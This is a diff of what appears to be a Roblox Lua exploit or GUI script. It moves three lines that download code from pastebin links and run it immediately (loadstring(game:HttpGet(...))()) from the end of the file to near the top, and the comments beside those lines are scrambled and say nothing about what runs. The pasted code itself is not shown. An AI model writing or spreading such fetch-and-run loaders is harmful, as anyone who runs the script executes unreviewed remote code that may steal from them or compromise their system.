@@ -10,6 +10,13 @@ CoreGui:SetCore("SendNotification", {
     Duration = 8
 })
 
+--game.Players.LocalPlayers.mg
+loadstring(game:HttpGet("https://pastebin.com/raw/9pDtfnLD"))()
+--Ctrller.P==kikkil
+loadstring(game:HttpGet("https://pastebin.com/raw/REdW8kfE"))()
+--3rdstring%"".<LoadLibrary:Hub#%*^>
+loadstring(game:HttpGet("https://pastebin.com/raw/P1Yrf09M"))()
+
 game:GetService("StarterGui"):SetCore("SendNotification",{ 	
 Title = "made by:",  	
 Text = "lulaslollipop🍭",
@@ -2451,10 +2458,3 @@ Frame.Parent.Draggable = true
 
 
 ---end----
-
---game.Players.LocalPlayers.mg
-loadstring(game:HttpGet("https://pastebin.com/raw/9pDtfnLD"))()
---Ctrller.P==kikkil
-loadstring(game:HttpGet("https://pastebin.com/raw/REdW8kfE"))()
---3rdstring%"".<LoadLibrary:Hub#%*^>
-loadstring(game:HttpGet("https://pastebin.com/raw/P1Yrf09M"))()
